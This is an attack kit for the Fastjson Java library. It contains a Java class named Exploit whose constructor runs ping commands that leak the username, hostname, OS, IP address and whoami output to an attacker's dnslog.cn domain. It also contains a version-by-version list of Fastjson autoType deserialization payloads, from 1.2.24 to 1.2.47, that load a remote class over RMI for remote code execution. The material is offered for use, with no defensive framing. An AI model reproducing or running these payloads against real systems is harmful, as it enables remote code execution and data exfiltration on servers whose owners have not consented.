```
public class Exploit {
    public Exploit(){
        String base_url = ".egpkd5.dnslog.cn"; //你的dnslog地址
        String win_dnslog = "windows" + base_url;
        // windows
        try{
            String[] commands = { "cmd", "/c", "ping username.%username%." + win_dnslog};
            Runtime.getRuntime().exec(commands);
        }catch(Exception e){
            // e.printStackTrace();
        }
        try{
            String[] commands = { "cmd", "/c", "ping computername.%computername%." + win_dnslog};
            Runtime.getRuntime().exec(commands);
        }catch(Exception e){
            // e.printStackTrace();
        }
        try{
            String[] commands = { "cmd", "/c", "ping os.%os%." + win_dnslog};
            Runtime.getRuntime().exec(commands);
        }catch(Exception e){
            // e.printStackTrace();
        }
        
        
        // linux
        String linux_dnslog = "linux" + base_url;
        try{

            String[] commands = { "/bin/sh", "-c", "ping ip.`ifconfig eth0|grep 'inet '|awk '{ print $2}'|awk -F: '{print $2}'|awk '{ gsub(/\\./,\"-\"); print $0 }'`." + linux_dnslog};
            Runtime.getRuntime().exec(commands);
        }catch(Exception e){
            // e.printStackTrace();
        }
        try{
            String[] commands = { "/bin/sh", "-c", "ping ip.`ifconfig eth0|grep 'inet '|awk '{ print $2}'|awk '{ gsub(/\\./,\"-\"); print $0 }'`." + linux_dnslog};
            Runtime.getRuntime().exec(commands);
        }catch(Exception e){
            // e.printStackTrace();
        }
        try{
            String[] commands = { "/bin/sh", "-c", "ping hostname.`cat /proc/sys/kernel/hostname`." + linux_dnslog};
            Runtime.getRuntime().exec(commands);
        }catch(Exception e){
            // e.printStackTrace();
        }
        try{
            String[] commands = { "/bin/sh", "-c", "ping user.`whoami`." + linux_dnslog};
            Runtime.getRuntime().exec(commands);
        }catch(Exception e){
            // e.printStackTrace();
        }
    }
    public static void main(String[] args){
        Exploit e = new Exploit();
    }
}
```
```
来源于  https://github.com/shengqi158/fastjson-remote-code-execute-poc

1.2.24
{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit", "autoCommit":true}}

未知版本(1.2.24-41之间)
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}

1.2.41
{"@type":"Lcom.sun.rowset.RowSetImpl;","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}

1.2.42
{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true};

1.2.43
{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true]}

1.2.45
{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"rmi://localhost:1099/Exploit"}}

1.2.47
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}}}
```
